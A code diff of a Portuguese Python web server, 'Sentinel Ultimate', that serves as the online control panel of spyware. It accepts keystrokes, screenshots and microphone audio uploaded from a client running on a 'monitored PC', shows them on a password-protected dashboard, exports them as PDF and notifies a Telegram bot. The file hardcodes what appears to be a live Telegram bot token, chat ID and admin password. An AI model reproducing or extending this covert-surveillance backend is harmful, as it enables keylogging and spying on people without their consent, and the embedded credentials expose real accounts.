@@ -2,12 +2,10 @@
 # -*- coding: utf-8 -*-
 """
 SENTINEL ULTIMATE - VERSÃO PARA RENDER (ONLINE)
-Funciona como painel de visualização apenas.
-As capturas devem ser feitas localmente em outro computador.
+Apenas painel web - sem capturas locais
 """
 
 import os
-import threading
 import time
 import requests
 from datetime import datetime
@@ -20,14 +18,13 @@ from io import BytesIO
 # CONFIGURAÇÕES
 # ============================================
 
-# Telegram (para receber dados do cliente local)
 BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0')
 CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '5672315001')
 
 USUARIO = "admin"
 SENHA = "SpyWatdon3609"
 
-# Dados recebidos do cliente local
+# Dados em memória (simulados)
 ultima_screenshot = None
 ultimo_audio = None
 ultimas_teclas = []
@@ -42,7 +39,7 @@ estatisticas = {
 }
 
 # ============================================
-# FUNÇÕES PARA RECEBER DADOS
+# FUNÇÃO PARA TESTAR TELEGRAM
 # ============================================
 
 def testar_telegram():
@@ -51,8 +48,8 @@ def testar_telegram():
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(url, data={"chat_id": CHAT_ID, "text": "🛡️ SENTINEL ONLINE INICIADO!"}, timeout=5)
         print("✅ Telegram CONECTADO!")
-    except:
-        print("⚠️ Telegram NÃO CONECTADO!")
+    except Exception as e:
+        print(f"⚠️ Telegram NÃO CONECTADO: {e}")
 
 # ============================================
 # SERVIDOR WEB
@@ -64,29 +61,33 @@ class Handler(BaseHTTPRequestHandler):
         pass
     
     def do_GET(self):
-        global logado, ultima_screenshot, ultimo_audio, estatisticas
+        global logado, ultima_screenshot, ultimo_audio, estatisticas, ultimas_teclas
         
+        # Screenshot
         if self.path.startswith('/screenshot'):
-            if ultima_screenshot and ultima_screenshot.startswith('http'):
-                # Redirecionar para URL da imagem
-                self.send_response(302)
-                self.send_header('Location', ultima_screenshot)
+            if ultima_screenshot:
+                self.send_response(200)
+                self.send_header('Content-type', 'image/png')
                 self.end_headers()
+                self.wfile.write(ultima_screenshot)
             else:
                 self.send_response(404)
                 self.end_headers()
             return
         
+        # Áudio
         elif self.path.startswith('/audio'):
-            if ultimo_audio and ultimo_audio.startswith('http'):
-                self.send_response(302)
-                self.send_header('Location', ultimo_audio)
+            if ultimo_audio:
+                self.send_response(200)
+                self.send_header('Content-type', 'audio/wav')
                 self.end_headers()
+                self.wfile.write(ultimo_audio)
             else:
                 self.send_response(404)
                 self.end_headers()
             return
         
+        # Keylog
         elif self.path == '/keylog':
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
@@ -94,6 +95,7 @@ class Handler(BaseHTTPRequestHandler):
             self.wfile.write(json.dumps({'teclas': ultimas_teclas[-50:]}).encode())
             return
         
+        # Estatísticas
         elif self.path == '/stats':
             self.send_response(200)
             self.send_header('Content-type', 'application/json')
@@ -107,8 +109,8 @@ class Handler(BaseHTTPRequestHandler):
             }).encode())
             return
         
+        # PDF
         elif self.path == '/export_pdf':
-            # PDF simplificado para versão online
             try:
                 from reportlab.lib.pagesizes import A4
                 from reportlab.pdfgen import canvas
@@ -176,6 +178,7 @@ class Handler(BaseHTTPRequestHandler):
                 self.wfile.write(f"Erro: {e}".encode())
             return
         
+        # Logout
         elif self.path == '/logout':
             logado = False
             self.send_response(302)
@@ -183,6 +186,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
             return
         
+        # Página principal
         elif self.path == '/':
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
@@ -198,6 +202,7 @@ class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         global logado, estatisticas, ultimas_teclas, ultima_screenshot, ultimo_audio
         
+        # Login
         if self.path == '/login':
             length = int(self.headers['Content-Length'])
             data = self.rfile.read(length).decode()
@@ -213,33 +218,39 @@ class Handler(BaseHTTPRequestHandler):
                 self.send_header('Content-type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({'success': False}).encode())
+            return
         
-        # Endpoint para receber dados do cliente local
+        # Receber dados do cliente (simulação)
         elif self.path == '/upload_data':
             length = int(self.headers['Content-Length'])
             data = self.rfile.read(length).decode()
-            dados = json.loads(data)
-            
-            if 'screenshot_url' in dados:
-                ultima_screenshot = dados['screenshot_url']
-                estatisticas['screenshots'] += 1
-            
-            if 'audio_url' in dados:
-                ultimo_audio = dados['audio_url']
-                estatisticas['audios'] += 1
-            
-            if 'teclas' in dados:
-                for tecla in dados['teclas']:
-                    ultimas_teclas.append(tecla)
-                    estatisticas['teclas'] += len(tecla)
-                    estatisticas['palavras'] += 1
-                if len(ultimas_teclas) > 100:
-                    ultimas_teclas = ultimas_teclas[-100:]
+            try:
+                dados = json.loads(data)
+                
+                if 'screenshot' in dados:
+                    ultima_screenshot = dados['screenshot'].encode() if isinstance(dados['screenshot'], str) else dados['screenshot']
+                    estatisticas['screenshots'] += 1
+                
+                if 'audio' in dados:
+                    ultimo_audio = dados['audio'].encode() if isinstance(dados['audio'], str) else dados['audio']
+                    estatisticas['audios'] += 1
+                
+                if 'teclas' in dados:
+                    for tecla in dados['teclas']:
+                        ultimas_teclas.append(tecla)
+                        estatisticas['teclas'] += len(tecla)
+                        estatisticas['palavras'] += 1
+                    if len(ultimas_teclas) > 100:
+                        ultimas_teclas = ultimas_teclas[-100:]
+            except:
+                pass
             
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b'OK')
+            return
         
+        # Limpar dados
         elif self.path == '/clear_all':
             ultimas_teclas = []
             estatisticas['screenshots'] = 0
@@ -252,13 +263,15 @@ class Handler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.end_headers()
             self.wfile.write(b'OK')
+            return
         
         else:
             self.send_response(404)
             self.end_headers()
+            return
 
 # ============================================
-# HTML (mesmo código anterior)
+# HTML
 # ============================================
 
 LOGIN_HTML = '''<!DOCTYPE html>
@@ -307,8 +320,6 @@ DASHBOARD_HTML = '''<!DOCTYPE html>
         .led{width:12px;height:12px;background:#0f0;border-radius:50%;animation:pulse 1s infinite}
         @keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
         .btn{background:#00ffcc;border:none;padding:8px 18px;border-radius:25px;cursor:pointer;margin:3px;font-weight:bold}
-        .btn-stop{background:#ff4444;color:white}
-        .btn-start{background:#00cc66;color:white}
         .btn-pdf{background:#ff4444;color:white}
         .btn-clear{background:#ffaa44;color:#333}
         .horizontal-grid{display:flex;gap:25px;margin-bottom:25px;flex-wrap:wrap}
@@ -328,8 +339,6 @@ DASHBOARD_HTML = '''<!DOCTYPE html>
     <div class="logo">🛡️ Sentinel Ultimate</div>
     <div class="status"><div class="led"></div><span id="statusText">Monitorando</span><span id="clock"></span></div>
     <div>
-        <button class="btn-start btn" onclick="iniciar()">▶️ Iniciar</button>
-        <button class="btn-stop btn" onclick="parar()">⏸️ Parar</button>
         <button class="btn" onclick="capturar()">📸</button>
         <button class="btn" onclick="audio()">🎤</button>
         <button class="btn-pdf btn" onclick="exportarPDF()">📄 PDF</button>
@@ -361,15 +370,13 @@ function atualizar(){
     let a=document.getElementById('aud');a.src='/audio?_='+Date.now();a.load();
     document.getElementById('aud_time').innerHTML='🎤 '+new Date().toLocaleTimeString();
     fetch('/keylog').then(r=>r.json()).then(d=>{let div=document.getElementById('keylog');if(d.teclas&&d.teclas.length)div.innerHTML=d.teclas.map(l=>`<div class="keylog-line">💬 ${escapeHtml(l)}</div>`).join('');else div.innerHTML='<div class="keylog-line">Nenhuma palavra...</div>'});
-    fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('s1').innerText=d.screenshots;document.getElementById('s2').innerText=d.audios;document.getElementById('s3').innerText=d.teclas;document.getElementById('s4').innerText=d.palavras;document.getElementById('statusText').innerHTML=d.monitorando?"🟢 Monitorando":"🔴 Parado"});
+    fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('s1').innerText=d.screenshots;document.getElementById('s2').innerText=d.audios;document.getElementById('s3').innerText=d.teclas;document.getElementById('s4').innerText=d.palavras});
     let u=Math.floor((Date.now()-startTime)/1000);document.getElementById('uptime').innerText=`${Math.floor(u/3600).toString().padStart(2,'0')}:${Math.floor((u%3600)/60).toString().padStart(2,'0')}:${(u%60).toString().padStart(2,'0')}`;
     document.getElementById('clock').innerHTML=new Date().toLocaleTimeString();
 }
 function escapeHtml(t){let d=document.createElement('div');d.textContent=t;return d.innerHTML}
-function iniciar(){fetch('/start',{method:'POST'})}
-function parar(){fetch('/stop',{method:'POST'})}
-function capturar(){alert('Captura manual não disponível no servidor online. Use o cliente local.')}
-function audio(){alert('Gravação manual não disponível no servidor online. Use o cliente local.')}
+function capturar(){alert('Captura não disponível online. Use o cliente local.')}
+function audio(){alert('Gravação não disponível online. Use o cliente local.')}
 function exportarPDF(){window.open('/export_pdf')}
 function sair(){window.location.href='/logout'}
 function limparTeclas(){if(confirm('Limpar teclas?'))fetch('/clear_teclas',{method:'POST'}).then(()=>atualizar())}
@@ -396,9 +403,8 @@ if __name__ == "__main__":
     print("🔐 SENHA: SpyWatdon3609")
     print("=" * 60)
     print("")
-    print("⚠️ IMPORTANTE:")
-    print("Este é o servidor ONLINE (painel de visualização).")
-    print("Para capturar dados, você precisa rodar o cliente local.")
+    print("⚠️ ATENÇÃO: Este é o servidor ONLINE (painel de visualização)")
+    print("📥 Para capturar dados, execute o cliente local no PC monitorado")
     print("=" * 60)
     
     testar_telegram()
